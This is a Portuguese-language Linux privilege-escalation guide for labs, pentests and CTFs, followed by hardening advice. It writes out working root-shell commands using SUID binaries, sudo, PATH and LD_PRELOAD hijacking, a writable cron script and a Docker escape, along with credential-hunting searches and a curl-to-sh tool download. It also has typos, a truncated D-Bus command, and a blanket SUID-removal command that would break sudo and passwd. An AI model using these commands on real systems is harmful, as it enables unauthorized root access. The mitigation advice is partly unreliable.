<!-- ===================== -->
<!--  Linux PrivEsc Guide  -->
<!-- ===================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-2ea44f?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Privilege%20Escalation-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Linux-000000?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Cybersecurity-0A66C2?style=flat-square&logo=securityscorecard&logoColor=white">
  <img src="https://img.shields.io/badge/Pentest-red?style=flat-square">
  <img src="https://img.shields.io/badge/CTF-Informational?style=flat-square">
</p>

---

# 🐧 Linux Privilege Escalation

> 📌 Documento técnico voltado ao estudo, enumeração e exploração de **escalamento de privilégios em sistemas Linux**, com foco em **ambientes de laboratório, pentest e CTFs**.

---

### 📅 Informações do Documento

- **Data:** 2026-01-20  
- **Status:** `developed`  
- **Nível:** Intermediário → Avançado  
- **Ambiente:** Linux (Ubuntu / Debian-based)  

---

### 🏷️ Tags

`#CyberSecurity` `#Linux` `#PrivilegeEscalation` `#Pentest` `#RedTeam` `#BlueTeam`  
`#TryHackMe` `#CTF` `#OffensiveSecurity` `#DefensiveSecurity`

---


---
# Introdução

## O que é Escalamento de Privilégios?

**Escalamento de Privilégios** (Privilege Escalation) é o processo pelo qual um usuário ou processo obtém mais permissões do qual originalmente possuía. Em sistemas Linux, isso geralmente se refere a:

- **Escalamento Vertical:** Usuários comum → Usuário root (UID 0)
- **Escalamento Horizontal:** Usuários A → Usuário B (mesmo nível de privilégio)

![Privilege Escalation](assets/Pasted%20image%2020260120124801.png)

## Por que é importante?

Em um cenário de pentest ou segurança:

1. **Impacto máximo:** Controle total do sistema
2. **Persistência:** Manter acesso após exploração inicial
3. **Movimentação lateral:** Acessar outros sistemas na rede
4. **Recuperação de dados:** Acessar informações sensíveis

## Cenários Comuns

```bash
# Cenário inicial típico
$ whoami
www-data # Usuário de baixo privilégio

# Objetivo final
$ whoami
root # Usuário com privilégios máximos
```

---
# Conceitos Fundamentais

## 1. Permissões Linux

### Sistema de Permissões Básico

```bash
# Exemplo de saída do ls -l
-rwxr-xr-- 1 root root 4096 Jan 15 10:30 script.sh
```

### Decomposição

```text
-        rwx       r-x       r--      1   root   root   4096   Jan 15 10:30   script.sh
↑        ↑         ↑         ↑        ↑    ↑      ↑      ↑          ↑           ↑
Tipo   Owner    Group     Others   Links  Dono   Grupo  Tamanho   Data        Nome
```

**Tipos de Arquivo:**

- `-`: Arquivo regular
- `d`: Diretório
- `l`: Link simbólico
- `c`: Dispositivo de caractere
- `b`: Dispositivo de bloco

**Permissões:**

- `r` (read): Leitura (4)
- `w` (write): Escrita (2)
- `x` (execute): Execução (1)

## 2. Permissões Especiais

### SUID (Set User ID)

```bash
# Exemplo de arquivo SUID
-rwsr-xr-x 1 root root 15600 Jan 15 10:30 /usr/bin/passwd
```

**Características:**

- Representado por `s` na permissão do dono
- Arquivo é executado com privilégios do **dono**, não do executante
- Permissão octal: **4** no primeiro dígito (`chmod 4755`)

### SGID (Set Group ID)

```bash
# Exemplo de arquivo SGID
-rwxr-sr-x 1 root staff 15600 Jan 15 10:30 /usr/bin/write
```

**Características:**

- Representado por `s` na permissão do grupo
- Arquivo é executado com os privilégios do **grupo**
- Útil para diretórios compartilhados
- Permissão octal: **2** no primeiro dígito (`chmod 2755`)

### Sticky Bit

```bash
# Exemplo de diretório com stiky bit
drwxrwxrwt 7 root root 4096 Jan 15 10:30 /tmp
```

- Representado por `t` na permissão de outros
- Em diretórios: só o dono pode deletar seus próprios arquivos
- Permissão octal: **1** no primeiro dígito (`chmod 1777`)

## 3. Capabilities (Capacidades)

Sistema mais granular de privilégios que substitui o root tudo-ou-nada:

```bash
# Verificar capabilities de um binário
getcap /usr/bin/ping

# Resultado:
/usr/bin/pinh = cap_net_raw+ep
```

**Capabilities comuns exploráveis:**

- `cap_dac_read_search`: Ignora permissões de leitura
- `cap_dac_override`: Ignora permissões de escrita
- `cap_setuid`: Permite modificar UID
- `cap_sys_admin`: Operações administrativas

## 4. Variáveis de Ambiente

### PATH

```bash
# Exibir PATH atual
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# Modificar PATH (temporariamente)
export PATH=/tmp:$PATH
```

**Risco:** Se um diretório inseguro (como `/tmp`) estiver no PATH, pode-se criar arquivos maliciosos com nomes de comandos comuns.

### LP_PRELOAD

```bash
# Forçar carregamento de biblioteca
export LD_PRELOAD=/tmp/malicious.so
```

Permite injetar código em processos executados.

---
# Enumeração Manual do Sistema

## 1. Informações do Sistema

```bash
# Sistema operacional e kernel
uname -a
# Linux ubuntu 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/os-release
# NAME="Ubuntu"
# VERSION="20.04.1 LTS (Focal Fossa)"
# ID=ubuntu
# ID_LIKE=debian
```

**Análise:** Versões antigas do kernel podem ter exploits conhecidos.

## 2. Usuários e Grupos

```bash
# Listar todos os usuários
cat /etc/passwd

# Formato: username:password:UID:GID:GECOS:home:shell
# Exemplo: root:x:0:0:root:/root:/bin/bash

# Usuários com shell interativo
cat /etc/passwd | grep -E "(bash|sh)$"

# Grupos do usuário atual
id
# uid=1000(www-data) gid=1000(www-data) groups=1000(www-data),4(adm),24(cdrom)

# Usuários que podem executar sudo
cat /etc/sudoers
cat /etc/sudoers.d/*
```

## 3. Buscando Arquivos SUID/SGID

```bash
# Buscar arquivos SUID
find / -type f -perm -4000 -ls 2>/dev/null

# Buscar arquivos SGID  
find / -type f -perm -2000 -ls 2>/dev/null

# Buscar arquivos SUID e SGID
find / -type f -perm -6000 -ls 2>/dev/null

# Buscar arquivos com permissões de escrita
find / -type f -perm -o=w -ls 2>/dev/null

# Buscar arquivos SUID de root
find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Explicação dos parâmetros:**

- `-type f`: Apenas arquivos regulares
- `-perm -4000`: Permissão SUID ativa
- `-ls`: Exibir em formato detalhado
- `2>/dev/null`: Redirecionar erros para o nulo (silencioso)

## 4. Capabilities

```bash
# Buscar binários com capabilities
getcap -r / 2>/dev/null

# Exemplo de output perigoso:
/usr/bin/python3.8 = cap_setuid+ep
```

## 5. Tarefas Agendadas (Cron Jobs)

```bash
# Cron jobs do usuário atual
crontab -l

# Cron jobs do sistema
ls -la /etc/cron*
cat /etc/crontab

# Diretórios de cron
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Verificar permissões de scripts cron
find /etc/cron* -type f -perm -o+w -ls 2>/dev/null
```

## 6. Serviços em Execução

```bash
# Processos em execução
ps aux
ps -ef

# Serviços com network
netstat -tulpn
ss -tulpn

# Serviços systemd
systemctl list-units --type=service
```

## 7. Histórico e Credenciais

```bash
# Histórico de comandos
history
cat ~/.bash_history

# Arquivos com credenciais
find / -type f -name "*pass*" -o -name "*cred*" -o -name "*config*" 2>/dev/null
find / -type f -exec grep -l "password\|passwd\|secret\|key" {} \; 2>/dev/null

# Arquivos de configuração comuns
ls -la /etc/  # mysql, apache, ssh configs
```

## 8. Montagens e Partições

```bash
# Sistema de arquivos montados
mount
cat /etc/fstab

# Partições com permissões especiais
findmnt
df -h
```

---
# Técnicas de Escalamento de Privilégios

## 1. Exploração de Binários SUID

### Exemplo 1: find com SUID

```bash
# Verificar se find tem SUID
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 233984 Jan 18  2018 /usr/bin/find

# Explorar para obter shell root
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Explicação:**

- `find .`: Procura no diretório atual
- `-exec /bin/sh -p \;`: Executa `/bin/sh` com privilégios preservados (`-p`)
- `-quit`: Sai após primeira execução

### Exemplo 2: nano/vi com SUID

```bash
# Se nano tem SUID
nano /etc/passwd

# Adicionar usuário root sem senha
root2::0:0:root:/root:/bin/bash

# Ou se vi/vim tem SUID
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### Exemplo 3: Bash com SUID

```bash
# Raro, mas se bash tiver SUID
bash -p
# O -p preserva privilégios, dando shell root
```

## 2. PATH Hijacking

```bash
# Cenário: script SUID que chama um comando sem path absoluto

# 1. Verificar script vulnerável
cat /opt/script_vulneravel.sh
#!/bin/bash
echo "Executando ls..."
ls /tmp  # CHAMADA PERIGOSA - ls sem path absoluto

# 2. Criar payload malicioso
echo '/bin/bash -p' > /tmp/ls
chmod 777 /tmp/ls

# 3. Modificar PATH
export PATH=/tmp:$PATH

# 4. Executar script SUID
/opt/script_vulneravel.sh  # Agora executa nosso ls malicioso!
```

## 3. LD_PRELOAD Hijacking

```bash
# 1. Criar biblioteca maliciosa
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

# 2. Compilar
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles

# 3. Executar programa SUID com LD_PRELOAD
sudo LD_PRELOAD=/tmp/exploit.so <programa_SUID>
```

## 4. Cron Job Exploitation

**Cenário:** Cron Job com Permissões de Escrita

```bash
# 1. Encontrar script de cron vulnerável
ls -la /etc/cron.hourly/script_vulneravel.sh
# -rwxrwxrwx 1 root root 100 Jan 15 10:30 script_vulneravel.sh

# 2. Analisar conteúdo
cat /etc/cron.hourly/script_vulneravel.sh
#!/bin/bash
echo "Backup realizado em $(date)" >> /var/log/backup.log

# 3. Substituir por payload
cat > /etc/cron.hourly/script_vulneravel.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

# 4. Aguardar execução do cron
# 5. Verificar se bash agora tem SUID
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1234376 Jan 18  2018 /bin/bash

# 6. Executar bash com privilégios
bash -p
```

## 5. Escalamento via Sudo

```bash
# 1. Verificar comandos permitidos com sudo
sudo -l

# Saída exemplo:
User www-data may run the following commands on server:
    (root) NOPASSWD: /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python
    (root) NOPASSWD: /usr/bin/awk

# 2. Explorar cada comando

# Via vi/vim
sudo vi -c ':!sh'

# Via python
sudo python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Via awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

## 6. Kernel Exploits

```bash
# 1. Identificar versão do kernel
uname -a

# 2. Buscar exploits conhecidos
# Exemplo para DirtyCow (CVE-2016-5195)
# 3. Compilar e executar exploit
gcc dirtycow.c -o dirtycow -pthread
./dirtycow

# IMPORTANTE: Testar sempre em ambiente controlado!
# Exploits de kernel podem causar instabilidade no sistema
```

## 7. Escalamento via Variáveis de Ambiente

Exploração do `env_keep` no sudo:

```bash
# Se sudoers permitir manter certas variáveis
Defaults env_keep += "LD_PRELOAD"

# Explorar:
sudo LD_PRELOAD=/tmp/exploit.so <comando_permitido>
```

## 8. Escalamento via D-Bus

```bash
# Verificar serviços D-Bus acessíveis
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
  --print-reply /org/freedesktop/Accounts/User1000 \
  org.freedesktop.DBus.Properties.GetAll string:"

# Explorar serviços vulneráveis
```

## 9. Docker Escape

Se dentro de container Docker:

```bash
# Verificar se container é privilegiado
cat /proc/self/status | grep CapEff
# Se CapEff: 0000003fffffffff → container privilegiado

# Montar filesystem do host
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Acessar sistema host
chroot /mnt/host
```

---
# Ferramentas Automatizadas

## 1. LinPEAS (Linux Privilege Escalation Awesome Script)

```bash
# Baixar e executar
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Ou baixar primeiro
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Executar apenas verificações rápidas
./linpeas.sh -quick
```

**Principais verificações do LinPEAS:**

- SUID/SGID files
- Capabilities
- Cron jobs
- Services
- Sudo permissions
- Kernel exploits
- Password hunting

## 2. LinEnum

```bash
# Baixar e executar
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Opções úteis:
./LinEnum.sh -t    # Verificações completas
./LinEnum.sh -r report.txt  # Salvar em arquivo
./LinEnum.sh -e /tmp/       # Exportar resultados
```

## 3. Linux Exploit Suggester

```bash
# Versão local (perl)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Verificar exploits específicos
./linux-exploit-suggester.sh -k 5.4.0
```

## 4. Linux Smart Enumeration (lse.sh)

```bash
# Baixar e executar
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh

# Níveis de verbosidade:
./lse.sh -l1  # Básico
./lse.sh -l2  # Detalhado (padrão)
./lse.sh -l3  # Tudo
```

## 5. BeRoot

```bash
# Para Python 2
wget https://github.com/AlessandroZ/BeRoot/raw/master/Linux/beroot.py
python beroot.py

# Verifica:
# - Configurações erradas
# - Vulnerabilidades conhecidas
# - Perfil de privilégios
```

## 6. pspy - Monitoramento de Processos

```bash
# Monitorar processos sem root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64

# Detecta:
# - Cron jobs
# - Serviços iniciados
# - Execuções automáticas
```

## 5. Uso Combinado de Ferramentas

```bash
# Fluxo recomendado:
# 1. Enumeração rápida
./linpeas.sh -quick > initial_scan.txt

# 2. Análise detalhada das áreas promissoras
./LinEnum.sh -t -r detailed_scan.txt

# 3. Sugestão de exploits específicos
./linux-exploit-suggester.sh

# 4. Monitoramento em tempo real (se necessário)
./pspy64 &
```

---
# Mitigação e Boas Práticas

## 1. Hardening de Permissões

### Minimizar SUID/SGID

```bash
# Remover SUID desnecessário
find / -type f -perm -4000 -exec chmod u-s {} \;

# Remover SGID desnecessário  
find / -type f -perm -2000 -exec chmod g-s {} \;

# Lista segura de binários SUID (Debian/Ubuntu):
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/chsh, /usr/bin/chfn
```

### Configurar o sistema para evitar SUID em /tmp e /var/tmp

```bash
# Montar partições com nosuid
# No /etc/fstab:
tmpfs   /tmp    tmpfs   nosuid,noexec,nodev  0 0
tmpfs   /var/tmp tmpfs  nosuid,noexec,nodev  0 0
```

## 2. Configuração Segura do Sudo

```bash
# /etc/sudoers seguro:

# 1. Sem NOPASSWD (exceto para casos específicos)
# RUIM: user ALL=(ALL) NOPASSWD: ALL
# BOM: user ALL=(ALL) ALL

# 2. Restringir comandos
Cmnd_Alias SAFE_COMMANDS = /usr/bin/apt, /usr/bin/systemctl restart nginx

# 3. Usar caminhos absolutos
Defaults secure_path = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 4. Limitar env_keep
Defaults env_reset
# Remover: Defaults env_keep += "LD_PRELOAD LD_LIBRARY_PATH"
```

## 3. Hardening do Kernel

```bash
# Configurações recomendadas no /etc/sysctl.conf:

# Prevenir links simbólicos em /tmp
fs.protected_symlinks = 1
fs.protected_hardlinks = 1

# Restringir informações do kernel
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2

# Prevenir ataques de memória
kernel.randomize_va_space = 2
```

## 4. Monitoramento e Auditoria

### Configurar auditd

```bash
# Instalar e configurar
apt install auditd

# Regras importantes no /etc/audit/rules.d/audit.rules:
-a always,exit -F arch=b64 -S setuid -S setgid -F key=privilege_escalation
-w /etc/sudoers -p wa -k sudoers_change
-w /etc/passwd -p wa -k passwd_change
-w /etc/crontab -p wa -k cron_change
```

### Tripwire ou AIDE

```bash
# Instalar AIDE
apt install aide

# Inicializar base de dados
aideinit

# Verificar integridade periodicamente
aide --check
```

## 5. SELinux/AppArmor

```bash
# Verificar status do SELinux
sestatus

# Verificar status do AppArmor
aa-status

# Perfis AppArmor para serviços críticos
# Exemplo para Apache:
apt install apparmor-profiles
aa-enforce /etc/apparmor.d/usr.sbin.apache2
```

## 6. Atualizações e Patch Management

```bash
# Atualizações automáticas de segurança
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades

# Listar pacotes não mantidos
apt-show-versions | grep 'No available version'

# Verificar vulnerabilidades conhecidas
apt list --upgradable
```

## 7. Políticas de Senhas e Autenticação

```bash
# Configurar PAM para senhas fortes
# /etc/pam.d/common-password:
password requisite pam_pwquality.so retry=3 minlen=12 difok=3

# Limitar tentativas de sudo
# /etc/pam.d/sudo:
auth required pam_tally2.so deny=5 unlock_time=900
```

## 8. Checklist de Mitigação

1. **SUID/SGID**
    - Remover SUID/SGID desnecessários
    - Auditoria regular de binários SUID        
    - Usar capabilities em vez de SUID quando possível

2. **Sudo**
    - Limitar comandos permitidos
    - Evitar NOPASSWD
    - Configurar secure_path        
    - Limitar env_keep

3. **Serviços**
    - Executar serviços com usuários dedicados
    - Implementar princípio do menor privilégio        
    - Usar containers/namespaces quando possível

4. **Monitoramento**
    - Configurar auditd
    - Implementar detecção de intrusão (IDS)        
    - Logs centralizados

5. **Atualizações**
    - Patch management automatizado
    - Monitorar vulnerabilidades conhecidas
    - Testar patches antes de produção

---
# Laboratório Prático 1: [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

## 1. Enumeração

A enumeração é o primeiro passo a ser dado após obter acesso a qualquer sistema. Você pode ter acessado o sistema explorando uma vulnerabilidade crítica que resultou em acesso de nível root ou simplesmente encontrado uma maneira de enviar comandos usando uma conta com privilégios baixos. Os testes de penetração, ao contrário das máquinas CTF, não terminam quando você obtém acesso a um sistema específico ou a um nível de privilégio de usuário. Como você verá, a enumeração é tão importante durante a fase pós-comprometimento quanto antes.

### `hostname`

O comando `hostname` retornará o nome do host da máquina alvo. Embora esse valor possa ser facilmente alterado ou conter uma string relativamente sem significado (por exemplo, Ubuntu-3487340239), em alguns casos, ele pode fornecer informações sobre a função do sistema alvo na rede corporativa (por exemplo, SQL-PROD-01 para um servidor SQL de produção).

```bash
hostname
```

**Saída:**

```text
wade7363
```

### `uname -a`

Irá imprimir informações do sistema, fornecendo detalhes adicionais sobre o kernel usado pelo sistema. Isso será útil ao procurar por possíveis vulnerabilidades no kernel que possam levar à escalada de privilégios.

```bash
uname -a
```

**Saída:**

```text
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86 64 x68_64 GNU/Linux
```

### `/etc/os-release`

Para fazer uma verificação da versão do sistema operacional utilizamos o comando `cat /etc/os-release`.

```bash
cat /etc/os-release
```

**Saída:**

```text
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu"
```

## 2. Explorando Vulnerabilidades

Através da enumeração e identificação da versão do kernel é possível descobrir que a versão Ubuntu 3.13 possuí a vulnerabilidade CVE-2015-1328.



---
# Conclusão

O escalamento de privilégios em Linux é uma área complexa que combina conhecimento profundo do sistema operacional com criatividade na exploração de configurações inadequadas. A defesa eficaz requer:

1. **Conscientização**: Entender os vetores de ataque
2. **Prevenção**: Configuração segura desde o início
3. **Detecção**: Monitoramento contínuo
4. **Resposta**: Plano de ação para incidentes

**Lembre-se:** Todas as técnicas descritas devem ser utilizadas apenas em sistemas que você possui ou tem autorização explícita para testar. O conhecimento de escalamento de privilégios é valioso tanto para profissionais de segurança defensiva quanto ofensiva, permitindo proteger sistemas contra ataques reais.

_"Conhece teu inimigo e conhece a ti mesmo; se tiveres cem batalhas para travar, cem vezes serás vitorioso." - Sun Tzu, A Arte da Guerra_

---
# Referências

### Documentação Oficial

- **Linux Manual Pages**: `man hier`, `man permissions`, `man capabilities`
- **Kernel Documentation**: [https://www.kernel.org/doc/html/latest/](https://www.kernel.org/doc/html/latest/)
- **SELinux**: [https://selinuxproject.org/](https://selinuxproject.org/)
- **AppArmor**: [https://apparmor.net/](https://apparmor.net/)

### Recursos de Aprendizado

#### Laboratórios Práticos

- **TryHackMe - # Linux PrivEsc**: [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)
- **TryHackMe - # Linux Privilege Escalation**[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

#### Cheat Sheets

- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- **Linux Privilege Escalation Checklist**: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Linux%2520-%2520Privilege%2520Escalation.md)
- **Sudo Killer**: [https://github.com/TH3xACE/SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)

#### Blogs e Tutoriais

- **Hacking Articles - Linux Privilege Escalation**: [https://www.hackingarticles.in/linux-privilege-escalation/](https://www.hackingarticles.in/linux-privilege-escalation/)
- **PayloadsAllTheThings**: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **0xdf's Blog**: [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/)

### Ferramentas

- **LinPEAS**: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **Linux Exploit Suggester**: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **pspy**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

